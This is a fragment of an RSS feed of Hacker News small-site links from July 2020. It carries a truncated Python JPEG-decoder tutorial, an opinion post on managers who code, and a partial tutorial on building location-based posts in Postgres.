<li>A 2015&nbsp;<a href="https://medium.com/@nickcrocker/how-to-lose-200m-pounds-why-myfitnesspal-works-d00f392d9783" target="_blank" rel="noopener">memo</a>: How MyFitnessPal works.</li>
<li>Meet&nbsp;<a href="https://highcourt.co/" target="_blank" rel="noopener">Highcourt</a>, NYC‚Äôs new wellness-focused ‚Äúleisure club‚Äù.</li>
<li>Who are the best early-stage fitness and wellness&nbsp;‚Ä¶</li></ul></div></div></section></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://insider.fitt.co/issue-no-87-why-mirror-sold/">https://insider.fitt.co/issue-no-87-why-mirror-sold/</a></em></p>]]>
            </description>
            <link>https://insider.fitt.co/issue-no-87-why-mirror-sold/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23838564</guid>
            <pubDate>Tue, 14 Jul 2020 22:04:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding and writing a JPEG decoder in Python]]>
            </title>
            <description>
<![CDATA[
Score 257 | Comments 45 (<a href="https://news.ycombinator.com/item?id=23837838">thread link</a>) | @sfpoet
<br/>
July 14, 2020 | https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/ | <a href="https://web.archive.org/web/*/https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">
			<span>
				<a target="_blank" href="https://github.com/yasoob/personal_blog/tree/master/content/posts/understanding-and-writing-jpeg-decoder-in-python.md">Source</a>
			</span>
			
				<p><img src="https://d33wubrfki0l68.cloudfront.net/797fe040e65dc288b7f22489dbad160e1e4998b8/0496b/images/decoding_jpeg/hero-image.png">
				</p>
			
			
			<span>
				
				<time itemprop="datePublished" datetime="2020-07-14">July 14, 2020</time>
				
			</span>
			<section itemprop="entry-text">
				

<p>Hi everyone! üëã Today we are going to understand the JPEG compression algorithm. One thing a lot of people don‚Äôt know is that JPEG is not a format but rather an algorithm. The JPEG images you see are mostly in the JFIF format (JPEG File Interchange Format) that internally uses the JPEG compression algorithm. By the end of this article, you will have a much better understanding of how the JPEG algorithm compresses data and how you can write some custom Python code to decompress it. We will not be covering all the nuances of the JPEG format (like progressive scan) but rather only the basic baseline format while writing our decoder.</p>

<h2 id="introduction">Introduction</h2>

<p>Why write another article on JPEG when there are already hundreds of articles on the internet? Well, normally when you read articles on JPEG, the author just gives you details about what the format looks like. You don‚Äôt implement any code to do the actual decompression and decoding. Even if you do write code, it is in C/C++ and not accessible to a wide group of people. I plan on changing that by showing you how a basic JPEG decoder works using Python 3. I will be basing my decoder on <a href="https://github.com/aguaviva/micro-jpeg-visualizer/blob/master/micro-jpeg-visualizer.py">this</a> MIT licensed code but will be heavily modifying it for increased readability and ease of understanding. You can find the modified code for this article on my  <a href="https://github.com/yasoob/Baseline-JPEG-Decoder">GitHub repo</a>.</p>

<h2 id="different-parts-of-a-jpeg">Different parts of a JPEG</h2>

<p>Let‚Äôs start with this nice image by <a href="https://twitter.com/angealbertini">Ange Albertini</a>. It lists all different parts of a simple JPEG file. Take a look at it. We will be exploring each segment. You might have to refer to this image quite a few times while reading this tutorial.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/bdc1363abbd5744200ec5283d4154e55143df86c/8c624/images/decoding_jpeg/jpegrgb_dissected.png" alt="JPEGRGB_dissected.png"></p>

<p>At the very basic level, almost every binary file contains a couple of markers (or headers). You can think of these markers as sort of like bookmarks. They are very crucial for making sense of a file and are used by programs like <code>file</code> (on Mac/Linux) to tell us details about a file. These markers define where some specific information in a file is stored. Most of the markers are followed by <code>length</code> information for the particular marker segment. This tells us how long that particular segment is.</p>

<h3 id="file-start-file-end">File Start &amp; File End</h3>

<p>The very first marker we care about is <code>FF D8</code>. It tells us that this is the start of the image. If we don‚Äôt see it we can assume this is some other file. Another equally important marker is <code>FF D9</code>. It tells us that we have reached the end of an image file. Every marker, except for <code>FFD0</code> to <code>FFD9</code> and <code>FF01</code>, is immediately followed by a length specifier that will give you the length of that marker segment. As for the image file start and image file end markers, they will always be two bytes long each.</p>

<p>Throughout this tutorial, we will be working with this image:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7344493a5ee7126f8286dd83ade191cab9e7f292/fbea3/images/decoding_jpeg/profile.jpg" alt="Profile"></p>

<p>Let‚Äôs write some code to identify these markers.</p>

<pre><code>from struct import unpack


marker_mapping = {
    0xffd8: "Start of Image",
    0xffe0: "Application Default Header",
    0xffdb: "Quantization Table",
    0xffc0: "Start of Frame",
    0xffc4: "Define Huffman Table",
    0xffda: "Start of Scan",
    0xffd9: "End of Image"
}


class JPEG:
    def __init__(self, image_file):
        with open(image_file, 'rb') as f:
            self.img_data = f.read()
    
    def decode(self):
        data = self.img_data
        while(True):
            marker, = unpack("&gt;H", data[0:2])
            print(marker_mapping.get(marker))
            if marker == 0xffd8:
                data = data[2:]
            elif marker == 0xffd9:
                return
            elif marker == 0xffda:
                data = data[-2:]
            else:
                lenchunk, = unpack("&gt;H", data[2:4])
                data = data[2+lenchunk:]            
            if len(data)==0:
                break        

if __name__ == "__main__":
    img = JPEG('profile.jpg')
    img.decode()    

# OUTPUT:
# Start of Image
# Application Default Header
# Quantization Table
# Quantization Table
# Start of Frame
# Huffman Table
# Huffman Table
# Huffman Table
# Huffman Table
# Start of Scan
# End of Image
</code></pre>

<p>We are using <a href="https://docs.python.org/3/library/struct.html">struct</a> to unpack the bytes of image data. <code>&gt;H</code> tells <code>struct</code> to treat the data as big-endian and of type <code>unsigned short</code>. The data in JPEG is stored in big-endian format. Only the EXIF data <em>can</em> be in little-endian (even though it is uncommon). And a short is of size 2 so we provide <code>unpack</code> two bytes from our <code>img_data</code>. You might ask yourself how we knew it was a <code>short</code>. Well, we know that the markers in JPEG are 4 hex digits: <code>ffd8</code>. One hex digit equals 4 bits (<sup>1</sup>‚ÅÑ<sub>2</sub> byte) so 4 hex digits will equal 2 bytes and a short is equal to 2 bytes.</p>

<p>The Start of Scan section is immediately followed by image scan data and that image scan data doesn‚Äôt have a length specified. It continues till the ‚Äúend of file‚Äù marker is found so for now we are manually ‚Äúseeking‚Äù to the EOF marker whenever we see the SOC marker.</p>

<p>Now that we have the basic framework in place, let‚Äôs move on and figure out what the rest of the image data contains. We will go through some necessary theory first and then get down to coding.</p>

<h2 id="encoding-a-jpeg">Encoding a JPEG</h2>

<p>I will first explain some basic concepts and encoding techniques used by JPEG and then decoding will naturally follow from that as a reverse of it. In my experience, directly trying to make sense of decoding is a bit hard.</p>

<p>Even though the image below won‚Äôt mean much to you right now, it will give you some anchors to hold on to while we go through the whole encoding/decoding process. It shows the steps involved in the JPEG encoding process: (<a href="https://users.cs.cf.ac.uk/Dave.Marshall/Multimedia/node234.html">src</a>)</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7237dd0093b6a8070b2c927673fd73bc797561d2/33b0a/images/decoding_jpeg/encoding.png" alt="JPEG Encoding process"></p>

<h3 id="jpeg-color-space">JPEG Color Space</h3>

<p>According to the JPEG spec (<a href="http://www.itu.int/rec/T-REC-T.872-201206-I/en">ISO/IEC 10918-6:2013 (E)</a>, section 6.1):</p>

<blockquote>
<ul>
<li>Images encoded with only one component are assumed to be grayscale data in which 0 is black and 255 is white.</li>
<li>Images encoded with three components are assumed to be RGB data encoded as YCbCr unless the image contains an APP14 marker segment as specified in 6.5.3, in which case the color encoding is considered either RGB or YCbCr according to the application data of the APP14 marker segment. The relationship between RGB and YCbCr is defined as specified in Rec. ITU-T T.871 | ISO/IEC 10918-5.</li>
<li>Images encoded with four components are assumed to be <strong>CMYK</strong>, with (0,0,0,0) indicating white unless the image contains an APP14 marker segment as specified in 6.5.3, in which case the color encoding is considered either <strong>CMYK</strong> or <strong>YCCK</strong> according to the application data of the APP14 marker segment. The relationship between <strong>CMYK</strong> and <strong>YCCK</strong> is defined as specified in clause 7.</li>
</ul>
</blockquote>

<p>Most JPEG algorithm implementations use luminance and chrominance (YUV encoding) instead of RGB. This is super useful in JPEG as the human eye is pretty bad at seeing high-frequency brightness changes over a small area so we can essentially reduce the amount of frequency and the human eye won‚Äôt be able to tell the difference. Result? A highly compressed image with almost no visible reduction in quality.</p>

<p>Just like each pixel in RGB color space is made up of 3 bytes of color data (Red, Green, Blue), each pixel in YUV uses 3 bytes as well but what each byte represents is slightly different. The Y component determines the brightness of the color (also referred to as luminance or luma), while the U  and V components determine the color (also known as chroma). The U component refers to the amount of blue color and the V component refers to the amount of red color.</p>

<p>This color format was invented when color televisions weren‚Äôt super common and engineers wanted to use one image encoding format for both color and black and white televisions. YUV could be safely displayed on a black and white TV if color wasn‚Äôt available. You can read more about its history on <a href="https://www.wikiwand.com/en/YUV">Wikipedia</a>.</p>

<h3 id="discrete-cosine-transform-quantization">Discrete Cosine Transform &amp; Quantization</h3>

<p>JPEG converts an image into chunks of 8x8 blocks of pixels (called MCUs or Minimum Coding Units), changes the range of values of the pixels so that they center on 0 and then applies Discrete Cosine Transformation to each block and then uses quantization to compress the resulting block. Let‚Äôs get a high-level understanding of what all of these terms mean.</p>

<p>A Discrete Cosine Transform is a method for converting discrete data points into a combination of cosine waves. It seems pretty useless to spend time converting an image into a bunch of cosines but it makes sense once we understand DCT in combination with how the next step works. In JPEG, DCT will take an 8x8 image block and tell us how to reproduce it using an 8x8 matrix of cosine functions.  <a href="https://www.impulseadventure.com/photo/jpeg-minimum-coded-unit.html">Read more here</a>)</p>

<p>The 8x8 matrix of cosine functions look like this:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/97f11adca54888172fc19cef52e514ef0e8b46fd/1a72e/images/decoding_jpeg/cosine-funcs.png" alt="Cosine functions"></p>

<p>We apply DCT to each component of a pixel separately. The output of applying DCT is an 8x8 coefficient matrix that tells us how much each cosine function (out of 64 total functions) contributes to the 8x8 input matrix. The coefficient matrix of a DCT generally contains bigger values in the top left corner of the coefficient matrix and smaller values in the bottom right corner. The top left corner represents the lowest frequency cosine function and the bottom right represents the highest frequency cosine function.</p>

<p>What this tells us is that most images contain a huge amount of low-frequency information and a small amount of high-frequency information. If we turn the bottom right components of each DCT matrix to 0, the resulting image would still appear the same because, as I mentioned, humans are bad at observing high-frequency changes. This is exactly what we do in the next step.</p>

<p>I found a wonderful video on this topic. Watch it if DCT doesn‚Äôt make too much sense.</p>

<iframe width="560" height="326" src="https://www.youtube.com/embed/Q2aEzeMDHMA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>We have all heard that JPEG is a lossy compression algorithm but so far we haven‚Äôt done anything lossy. We have only transformed 8x8 blocks of YUV components into 8x8 blocks of cosine functions with no loss of information. The lossy part comes in the quantization step.</p>

<p>Quantization is a process in which we take a couple of values in a specific range and turns them into a discrete value. For our case, this is just a fancy name for converting the higher ‚Ä¶</p></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/">https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/</a></em></p>]]>
            </description>
            <link>https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23837838</guid>
            <pubDate>Tue, 14 Jul 2020 21:03:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Manager Can‚Äôt Code? They Shouldn‚Äôt Be Your Manager]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 57 (<a href="https://news.ycombinator.com/item?id=23837614">thread link</a>) | @lanecwagner
<br/>
July 14, 2020 | https://qvault.io/2020/07/14/your-manager-cant-code-they-shouldnt-be-your-manager/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/07/14/your-manager-cant-code-they-shouldnt-be-your-manager/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Managers who can‚Äôt code are an outdated artifact of corporate America circa 2005. The best managers that I‚Äôve had spend ~80% of their time coding, architecting, or doing technical work that requires engineering prowess. If your manager thinks coding is ‚Äúbeneath‚Äù them then they need a dose of humble pie. Your organization would likely be better off without them.</p>



<h2><span id="But_Managers_Manage_People">But Managers Manage <em>People</em>!</span>
</h2>



<p>There is a long-running stigma associated with developers, that we are all geeks who can‚Äôt handle interpersonal relationships. Due to our code monkey nature, we need ‚Äúpeople people‚Äù who can go to meetings for us and communicate our efforts effectively to the higher-ups.</p>



<div><figure><img src="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg" alt="introverted programmers are an outdated meme" srcset="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg 700w, https://qvault.io/wp-content/uploads/2020/07/joke-extrovert-300x184.jpg 300w" sizes="(max-width: 700px) 100vw, 700px" data-srcset="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg 700w, https://qvault.io/wp-content/uploads/2020/07/joke-extrovert-300x184.jpg 300w" data-src="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div>



<p>While the above is still funny, it‚Äôs <em>outdated</em>. As the developer community has grown exponentially in the last 20 years, so too has the personality diversity amongst its members. In other words, it is<strong> not hard to find developers with the soft-skills </strong>necessary for management positions.</p>



<h2><span id="Managers_Should_Help">Managers Should Help</span>
</h2>



<p>I am a firm believer in the following:</p>



<figure><img src="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png" alt="" srcset="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png 1024w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-300x150.png 300w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-768x384.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png 1024w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-300x150.png 300w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-768x384.png 768w" data-src="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure><p>While the manager doesn‚Äôt need to be the most talented developer on the team, they must at least be technically literate. When a team member goes to their boss with a technical proposal, the manager should be able to give valuable feedback.</p>



<p>In this <a href="https://hbr.org/2016/12/if-your-boss-could-do-your-job-youre-more-likely-to-be-happy-at-work">study from Harvard</a> 35,000 employees from the US and Great Britain were polled about their job satisfaction, and metrics were gathered about what influenced their happiness at work. The results showed that the <em>single greatest influencing factor </em>on employee satisfaction was whether or not their boss was technically competent. I practice what I preach, so at the <a href="https://classroom.qvault.io/">Qvault app,</a> all engineering leadership will forever be responsible for pushing code.</p>



<p>Contrast the idea of a competent boss with the all-too-familiar experience of going to a <a href="https://qvault.io/2020/05/18/leave-scrum-to-rugby-i-like-getting-stuff-done/">non-technical middle-management type</a> with an engineering problem, only to be stuck in a teaching session because the boss has never heard of a pub-sub system.</p>



<figure><img src="https://qvault.io/wp-content/uploads/2020/07/9e3a6f35f44188bad76c100f3560ce69.gif" alt="" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure><h2><span id="Managers_Need_Empathy">Managers Need Empathy</span>
</h2>



<p>A good manager has empathy for those who report to them. If the boss doesn‚Äôt code or hasn‚Äôt written code in a long time, they won‚Äôt understand the daily problems that their team is faced with. A good engineering leader will not only understand modern problems, but they make it their role to actively seek technical solutions in an ever-changing innovative landscape.</p>



<h2><span id="INB4_So_the_CEO_needs_to_be_able_to_code">INB4: ‚ÄúSo the CEO needs to be able to code?‚Äù</span>
</h2>



<p>No, but the CTO does!</p>



<p>I am sympathetic to the idea that the CTO will have plenty of business and product-related work to focus on, but they can‚Äôt let their technical chops slip. In order to run the engineering arm of an innovative company, the person at the top should have a firm mental grasp on the implementation difficulties. If this just means reviewing architectural diagrams and reviewing pull-requests so be it, but nothing beats hands-on engineering work to stay sharp.</p>



<h2><span id="Feedback_Please">Feedback Please</span>
</h2>



<p>Have you had problems with non-technical leaders, or do you disagree completely with my opinions? Let me know through one of my <a href="https://qvault.io/contact/">social profiles</a>.</p>



<div><div>
<h2><span id="Thanks_For_Reading">Thanks For Reading</span>
</h2>



<p>Follow us on Twitter <a href="https://twitter.com/q_vault">@q_vault</a> if you have any questions or comments</p>



<p>Take game-like coding courses on <a href="https://classroom.qvault.io/#/">Qvault Classroom</a></p>



<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe">Subscribe</a> to our Newsletter for more educational articles</p>
</div></div>



<h2><span id="Related_Articles">Related Articles:</span>
</h2>



<ul><li><a href="https://qvault.io/2020/05/18/leave-scrum-to-rugby-i-like-getting-stuff-done/">Leave Scrum to Rugby, I Like Getting Stuff Done</a></li></ul>



		</div></div>]]>
            </description>
            <link>https://qvault.io/2020/07/14/your-manager-cant-code-they-shouldnt-be-your-manager/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23837614</guid>
            <pubDate>Tue, 14 Jul 2020 20:46:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Recreating YikYak with Postgres]]>
            </title>
            <description>
<![CDATA[
Score 82 | Comments 23 (<a href="https://news.ycombinator.com/item?id=23837269">thread link</a>) | @AJRF
<br/>
July 14, 2020 | https://adamfallon.com/2020/07/10/recreating-yikyak-with-postgres/ | <a href="https://web.archive.org/web/*/https://adamfallon.com/2020/07/10/recreating-yikyak-with-postgres/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Yik_Yak" target="_blank">YikYak</a> was an anonymous social network that used your location to show you posts 5km around you.  Users of the app could create new posts and the people around them could view the posts and vote up or down.</p>



<p>YikYak filed a few patents for the tech that helped them achieve this. The patents mention segmenting users into buckets by their physical location. One modern tool we have to recreate this type of user segmentation is a data-structure called an <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/R*_tree" target="_blank">R-Tree</a>. </p>



<figure><img data-attachment-id="154" data-permalink="https://adamfallon.com/1rsz300nanspcxrd2bu5sqw/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?fit=2000%2C873&amp;ssl=1" data-orig-size="2000,873" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1rsz300nanspcxrd2bu5sqw" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?fit=300%2C131&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?fit=580%2C253&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>An example on an R-Tree in action</em></figcaption></figure>



<p>R-trees&nbsp;are&nbsp;tree data structures&nbsp;used for&nbsp;spatial access methods, i.e., for indexing multi-dimensional information such as&nbsp;<strong>geographical coordinates</strong>,&nbsp;rectangles&nbsp;or&nbsp;polygons.</p>



<p>Luckily the Postgres database enables us to make use of this data-structure via geospatial extensions. In this post I am going to;</p>



<ol><li>Show how we can enable those extensions.</li><li>Seed a few posts into our database.</li><li>Find the posts in a small around a specific latitude and longitude using a SQL query.</li></ol>



<p>Let‚Äôs get started!</p>



<hr>



<h2>Creating tables.</h2>



<p>Firstly you will need an instance of Postgres. It is easy to set up in Docker (I‚Äôve detailed a post <a rel="noreferrer noopener" href="https://adamfallon.com/2020/07/08/postgres-in-docker/" target="_blank">here</a> showing how). </p>



<p>I am going to be using DBeaver for this tutorial but you could use psql or any other Postgres connector. Let‚Äôs creating a new table for our posts.</p>



<div><figure><img data-attachment-id="207" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-32-15/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?fit=2560%2C296&amp;ssl=1" data-orig-size="2560,296" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.32.15" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?fit=300%2C35&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?fit=580%2C67&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>Select the SQL Editor</em></figcaption></figure></div>



<div><figure><img data-attachment-id="209" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-32-36/" data-orig-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?fit=829%2C339&amp;ssl=1" data-orig-size="829,339" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.32.36" data-image-description="" data-medium-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?fit=300%2C123&amp;ssl=1" data-large-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?fit=580%2C237&amp;ssl=1" src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>Chose whatever Database you want. I am going with Postgres</em></figcaption></figure></div>



<div><figure><img data-attachment-id="210" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-33-04/" data-orig-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?fit=1090%2C682&amp;ssl=1" data-orig-size="1090,682" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.33.04" data-image-description="" data-medium-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?fit=300%2C188&amp;ssl=1" data-large-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?fit=580%2C363&amp;ssl=1" src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>Name your script</em></figcaption></figure></div>



<p>Ready to go ‚Äì So below we have a simple example of table for storing new posts. I am using a split latitude and longitude to show how the extensions work, but you could also combine the two into a POINT datatype if you are planning to use a lot of columns.</p>



<pre>CREATE TABLE post (
	id int8 NOT NULL GENERATED ALWAYS AS IDENTITY,
	post_content text NOT NULL,
	latitude float8 NOT NULL,
	longitude float8 NOT NULL
);</pre>



<p>On executing that you should have a table you can start insert values into. </p>



<h2>Inserting posts.</h2>



<p>So let‚Äôs start out by inserting two posts, the first posted from 10 Downing Street, and the second from Buckingham Palace.</p>



<pre>INSERT INTO post VALUES (
	default,
	'I absolutely love the Queen. I hope she thinks I am doing a good job.',
	51.5034,
	0.1276
);
INSERT INTO post VALUES (
	default,
	'The new Prime Minister is a prat! I do hope he doesnt come over often',
	51.5014,
	0.1419
);</pre>



<p>Now let‚Äôs put another post in from an aspiring politics student who is located in Cambridge University (65 miles away). Now we have an outlier that won‚Äôt show up once we do location bound queries later in this tutorial.</p>



<pre>INSERT INTO post VALUES (
	default,
	'Day one of my politics degree. Shall be most fun to stalk the halls of Westminister in 4 years.',
	52.2053,
	0.1218
);</pre>



<h2>Installing Postgres extensions</h2>



<p>We would like to be able to stand in St. James park (a large park between 10 Downing Street and Buckingham Palace) and see the two posts close by, but not the one from Cambridge.</p>



<p>So how do we do that? Through extensions! Postgres enables users to incrementally add features that help us do new things with our data.</p>



<p>Once they are installed we can use the latitude and longitude of <em>51.5032, -0.1349</em> to create a new select query on our posts table.</p>



<div data-amp-noloading="true" data-amp-lightbox="true"><figure><img data-attachment-id="217" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-55-52/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?fit=2560%2C1382&amp;ssl=1" data-orig-size="2560,1382" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.55.52" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?fit=300%2C162&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?fit=580%2C313&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>You can install extensions in Postgres simply by running a query. The two extensions we need are <strong><em>cube</em></strong> and <strong><em>earthdistance</em></strong>.</p>



